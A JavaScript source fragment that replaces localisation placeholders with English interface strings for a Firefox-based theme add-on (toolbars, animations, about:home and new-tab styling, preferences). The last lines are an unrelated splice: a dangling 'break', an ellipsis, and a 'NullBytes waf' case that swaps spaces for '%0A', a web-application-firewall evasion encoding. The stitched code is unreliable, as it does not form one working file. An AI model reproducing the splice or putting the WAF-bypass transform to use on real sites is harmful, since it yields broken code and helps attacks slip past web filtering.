 txt = txt.replace(/&Ctr_aerocolors;/g, "Blue Aero colors for toolbars (and tabs)");
 txt = txt.replace(/&Ctr_aerocolorsg;/g,	"Grey-blue Aero colors");
 txt = txt.replace(/&Ctr_transpttbw10;/g,	"Title/menu/tabs toolbar: remove background color");
 txt = txt.replace(/&Ctr_transpttbew10;/g,	"Additional tweaks for some OS themes");
 txt = txt.replace(/&Ctr_transptcw10;/g,	"Hide default OS min/max/close buttons");
 txt = txt.replace(/&Ctr_hidenavbar;/g, "Hide toolbar");
 txt = txt.replace(/&Ctr_navbarpad;/g, "Additional left and right space");
 txt = txt.replace(/&Ctr_navbarpad_l;/g,	"Left:");
 txt = txt.replace(/&Ctr_navbarpad_r;/g,	"Right:");
 txt = txt.replace(/&Ctr_nobookbarbg;/g,	"Remove background color");
 txt = txt.replace(/&Ctr_bookbarfs;/g, "In full screen mode");
 txt = txt.replace(/&Ctr_nonavbarbg;/g, "Remove background color");
 txt = txt.replace(/&Ctr_nonavbarbg1;/g,	"This add-on's additional toolbars and other top toolbars are affected.");
 txt = txt.replace(/&Ctr_nonavbarbg2;/g,	"All toolbars in 'Beyond Australis' add-on's 'Slim Chrome' are affected.");
 txt = txt.replace(/&Ctr_nonavborder;/g,	"Add top border to toolbar");
 txt = txt.replace(/&Ctr_nonavtbborder;/g,	"Top toolbars: remove toolbar borders");
 txt = txt.replace(/&Ctr_toptb_oldpad;/g,	"Top toolbars: old left and right padding");
 txt = txt.replace(/&Ctr_hidesbclose;/g,	"Sidebars: hide close button");
 txt = txt.replace(/&Ctr_notextshadow;/g,	"Toolbars: hide shadow for toolbar text and tab text");
 txt = txt.replace(/&Ctr_chevronfix;/g, "Navigation toolbar: hide double arrow ('More Tools') at toolbars end");
 txt = txt.replace(/&Ctr_tbsep_winc;/g, "Top toolbars: additional toolbar separators");

 txt = txt.replace(/&Ctr_closeabarbut;/g,	"Add-on bar: hide close button");
 txt = txt.replace(/&Ctr_highaddonsbar;/g,	"Increase height");
 txt = txt.replace(/&Ctr_lessaddonsbar;/g,	"Decrease height");
 txt = txt.replace(/&Ctr_addonbarfs;/g, "In full screen mode");

 txt = txt.replace(/&Ctr_tabthrobber;/g,	"Loading image");
 txt = txt.replace(/&Ctr_bmanimation;/g,	"Bookmark stars bookmarking animation");
 txt = txt.replace(/&Ctr_pananimation;/g,	"Panel opening animation");
 txt = txt.replace(/&Ctr_tabanimation;/g,	"Tab closing/opening animation");
 txt = txt.replace(/&Ctr_dlanimation;/g,	"'Download notification' animation");
 txt = txt.replace(/&Ctr_fsanimation;/g,	"Full screen animations");
 txt = txt.replace(/&Ctr_fsaduration;/g,	"Full screen animations for HTML5 content");

 txt = txt.replace(/&Ctr_toolsitem;/g, "Menuitem in tools menu");
 txt = txt.replace(/&Ctr_appmenuitem;/g,	"Menuitem in appbuttons menu");
 txt = txt.replace(/&Ctr_contextitem;/g,	"Menuitem in toolbars context menu");
 txt = txt.replace(/&Ctr_puictrbutton;/g,	"Button in main panel menu");

 txt = txt.replace(/&Ctr_otherctroptns;/g,	"Other settings");
 txt = txt.replace(/&Ctr_cuibotbuttons;/g,	"Extra buttons in 'Customize' mode");
 txt = txt.replace(/&Ctr_nodevtheme;/g, "Prevent 'Developer Edition Theme' from being enabled");

 txt = txt.replace(/&Ctr_experttweaks;/g,	"Advanced");
 txt = txt.replace(/&Ctr_fx34loop;/g, "Unchecking this preference removes 'calling and conversation' features.");
 txt = txt.replace(/&Ctr_fx38pocket;/g, "Unchecking this preference disables the 'Pocket' feature and removes 'Pocket' button from toolbars.");
 txt = txt.replace(/&Ctr_fx38pocket2;/g,	"Note: Moving Pocket button to 'Additional Tools and Features' area in 'Customize' mode before disabling this preference removes all Pocket-related entries from Bookmarks menu and Reader menu popups.");
 txt = txt.replace(/&Ctr_e_loop;/g, 	"Hello / Calling and conversation / Loop");
 txt = txt.replace(/&Ctr_e_readermode;/g,	"Reader mode");
 txt = txt.replace(/&Ctr_e_geolocation;/g,	"Geolocation");
 txt = txt.replace(/&Ctr_e_pocket;/g, "Pocket");
 txt = txt.replace(/&Ctr_e_tabsaudioico;/g,	"Audio playing icon");
 txt = txt.replace(/&Ctr_e_containertab;/g,	"Container Tabs");
 txt = txt.replace(/&Ctr_e_findbarhl;/g,	"Findbar highlighting");
 txt = txt.replace(/&Ctr_fx50findbarhl;/g,	"Unchecking these preferences removes findbars new 'highlight' features.");
 txt = txt.replace(/&Ctr_e_flyweb;/g, "Flyweb");
 txt = txt.replace(/&Ctr_e_oldfontgfx;/g,	"Old font rendering");


 txt = txt.replace(/&Ctr_pw_settings;/g,	"Settings");
 txt = txt.replace(/&Ctr_pw_set_reset;/g,	"Restore defaults");
 txt = txt.replace(/&Ctr_pw_set_predef;/g,	"Classic preset");
 txt = txt.replace(/&Ctr_pw_set_preaus;/g,	"&brandShortName; preset");
 txt = txt.replace(/&Ctr_pw_set_export;/g,	"Export preferences");
 txt = txt.replace(/&Ctr_pw_set_import;/g,	"Import preferences");
 txt = txt.replace(/&Ctr_pw_set_syncon;/g,	"Add to Sync");
 txt = txt.replace(/&Ctr_pw_set_syncoff;/g,	"Remove from Sync");

 txt = txt.replace(/&Ctr_special_font;/g,	"Background color settings are for default theme only!");
 txt = txt.replace(/&Ctr_special_info;/g,	"Some options may not always offer visible changes");
 txt = txt.replace(/&Ctr_special_info2;/g,	"Third party theme detected! Some options do not work with third party themes!");
 txt = txt.replace(/&Ctr_special_acr;/g,	"Only report issues through official support channels and not by using 'Add-on Compatibility Reporter'!");

 txt = txt.replace(/&Ctr_addon-bar.accesskey;/g, "A");
 txt = txt.replace(/&appMenuGettingStarted.label;/g,	"Getting started");
 txt = txt.replace(/&goCmd.label;/g, "Go");

 txt = txt.replace(/&Ctr_openInCurrentTab;/g, 	"Open inputs in current tab");
 txt = txt.replace(/&Ctr_openInNewTab;/g,  "Open inputs in a new tab");
 txt = txt.replace(/&Ctr_openInNewWindow;/g, 	"Open inputs in a new window");
 txt = txt.replace(/&backCmd.accesskey;/g,  "B");
 txt = txt.replace(/&forwardCmd.accesskey;/g, 	"F");
 txt = txt.replace(/&reloadCmd.accesskey;/g, 	"R");
 txt = txt.replace(/&stopCmd.accesskey;/g,  "S");
 txt = txt.replace(/&bookmarkPageCmd2.accesskey;/g, "m");

//<!-- Fallback entities. Do not change! -->
 txt = txt.replace(/&openCmd.commandkey;/g,  "");
 txt = txt.replace(/&urlbar.accesskey;/g,  "");
 txt = txt.replace(/&urlbar.placeholder2;/g, 	"");

//<!-- Extra CyberCTR Additions --);

 txt = txt.replace(/&Ctr_appbuttonc_d;/g,	"Cyberfox (default)");
 txt = txt.replace(/&Ctr_appbuttonc_s;/g,	"Salmon");

 txt = txt.replace(/&Ctr_alt_newtabpalt;/g,	"New tab page: styled appearance");
 txt = txt.replace(/&ctr_aboutnewtab.customhighlight;/g, "Use custom highlight color");
 txt = txt.replace(/&ctr_aboutnewtab.customhighlightcol;/g, "Change custom highlight color");
 txt = txt.replace(/&ctr_aboutnewtab.custombase;/g, "Use custom text color");
 txt = txt.replace(/&ctr_aboutnewtab.custombasecol;/g, "Change base text color");

 txt = txt.replace(/&Ctr_alt_newtabcol;/g,	"New tab page: columns");
 txt = txt.replace(/&Ctr_alt_newtabrow;/g,	"New tab page: rows");

 txt = txt.replace(/&Ctr_classic_elements;/g, "Classic Elements");
 txt = txt.replace(/&Ctr_pw_set_preaust;/g, "Australis Pre-set");
 txt = txt.replace(/&ctr_Support_forums;/g,	"Support Forum");
 txt = txt.replace(/&ctr_help_features;/g,	"Features &amp; Information");

 txt = txt.replace(/&Ctr_custtabfontsize.label;/g,	"Tab font size: ");

 txt = txt.replace(/&ctr_applyCTRPrefFile.label;/g,	"Apply Changes");
 txt = txt.replace(/&ctr_restoreCTRPrefFile.label;/g,	"Restore Backup");
 txt = txt.replace(/&ctr_resetCTRPrefFile.label;/g,	"Clear Backup");

 txt = txt.replace(/&ctr_appbuttoncusttextcolor;/g,	"AppButton text color.");
 txt = txt.replace(/&ctr_appbuttoncusttextshadow;/g,	"Remove AppButton text shadow");

 txt = txt.replace(/&ctr_toolbarsearchbar.description;/g,	"Toolbar search bar");
 txt = txt.replace(/&ctr_toolbarsearchbarcustwidth.label;/g,	"Enable custom maximum width");
 txt = txt.replace(/&ctr_toolbarsearchbarwidth.label;/g,	"Search-bar maximum width: ");
 txt = txt.replace(/&ctr_colapseaddonsearchbar.label;/g,	"Collapsible about:addons search bar");
 txt = txt.replace(/&Ctr_alwaysshowaddonversion.label;/g,	"(Always Show)");

 txt = txt.replace(/&ctr_bookmarkfontsize.description;/g,	"Bookmarks Toolbar");
 txt = txt.replace(/&ctr_custombookmarkfontsize.label;/g,	"Enable custom font size on bookmarks toolbar");
 txt = txt.replace(/&ctr_cbookmarkfontsize.label;/g,	"Bookmarks font size: ");

 txt = txt.replace(/&ctr_abouthome.caption;/g, "Change about:home page style");
 txt = txt.replace(/&ctr_abouthome.default;/g, "Default about:home style");
 txt = txt.replace(/&ctr_abouthome.light;/g, "Light about:home style");
 txt = txt.replace(/&ctr_abouthome.dark;/g, "Dark about:home style");
 txt = txt.replace(/&ctr_abouthome.simplicity;/g,  "Simplicity about:home style");
 txt = txt.replace(/&ctr_abouthome.links;/g, "No links on about:home page");
 txt = txt.replace(/&ctr_abouthome.apps;/g, "No apps on about:home page");
 txt = txt.replace(/&ctr_abouthome.logo;/g, "No logo on about:home page");
 txt = txt.replace(/&ctr_abouthome.icons;/g, "No icons on about:home page");
 txt = txt.replace(/&ctr_abouthome.snippets;/g, "No snippets on about:home page");
 txt = txt.replace(/&ctr_abouthome.custombg;/g, "Use custom background image");
 txt = txt.replace(/&ctr_abouthome.custombgbrowse;/g, "Browse");
 txt = txt.replace(/&ctr_abouthome.custombgurl;/g, "Enter url or file path");
 txt = txt.replace(/&ctr_abouthome.custombgurlph;/g, "Background image url|path");
 txt = txt.replace(/&ctr_abouthome.customhighlight;/g, "Use custom highlight color");
 txt = txt.replace(/&ctr_abouthome.customhighlightcol;/g, "Change custom highlight color");
 txt = txt.replace(/&ctr_abouthome.custombase;/g, "Use custom text color");
 txt = txt.replace(/&ctr_abouthome.custombasecol;/g, "Change base text color");
 txt = txt.replace(/&ctr_abouthome.animate;/g, "Use animations on about:home page");
 txt = txt.replace(/&ctr_abouthome.custombgstretch;/g, "Stretch background image to window (Default).");

 txt = txt.replace(/&ctr_aboutnewtab.caption;/g, "Change about:newtab page style");

 txt = txt.replace(/&cssClassId.description;/g, "Hide element classes - element ids");
 txt = txt.replace(/&cssClassId.label;/g, "Enter a class or id:");
 txt = txt.replace(/&useFilterElement.label;/g, "Use custom filter to hide element classes or element ids");
 txt = txt.replace(/&filterElement.placehold;/g, "You can specify which element classes or element ids.");
 txt = txt.replace(/&add.label;/g, "ADD");
 txt = txt.replace(/&clear.label;/g, "Clear Filter");
 txt = txt.replace(/&copy.label;/g, "Copy Filter");

 txt = txt.replace(/&Ctr_tabthrobber_usecust.label;/g, "Use custom tab throbber");
 txt = txt.replace(/&Ctr_tabthrobber_custurlph.label;/g, "Throbber image url|path");

 txt = txt.replace(/&Ctr_animatelwtheme;/g, "Animate Animated light-weight themes on startup.");

 txt = txt.replace(/&Ctr_tbp_abouthome;/g,"AboutHome Page");
 txt = txt.replace(/&Ctr_tbp_newtab;/g, "NewTab Page");

 txt = txt.replace(/&Ctr_dark.label;/g, "(Dark)");
 txt = txt.replace(/&Ctr_light.label;/g, "(Light)");
 txt = txt.replace(/&Ctr_alt.label;/g, "(Alt)");//
					break;//
		...
		//NullBytes waf
			case 'null waf 0': txt = txt.replace(/ /g, "%0A");
